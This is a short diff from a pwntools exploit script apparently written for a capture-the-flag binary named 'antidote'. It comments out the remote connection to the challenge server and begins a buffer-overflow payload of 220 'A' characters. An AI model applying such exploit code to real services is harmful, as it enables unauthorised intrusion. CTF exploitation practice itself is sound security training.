@@ -37,8 +37,8 @@ context.log_level = "debug"
 elf = ELF('./antidote')
 libc = ELF('./libc.so.6')
 
-ip, port = '165.232.42.8', 30213
-io = remote(ip, port)
+#ip, port = '165.232.42.8', 30213
+#io = remote(ip, port)
 #io = process(['qemu-arm', '-L','/usr/arm-linux-gnueabihf','./antidote'])
 
 payload = 'A'*220
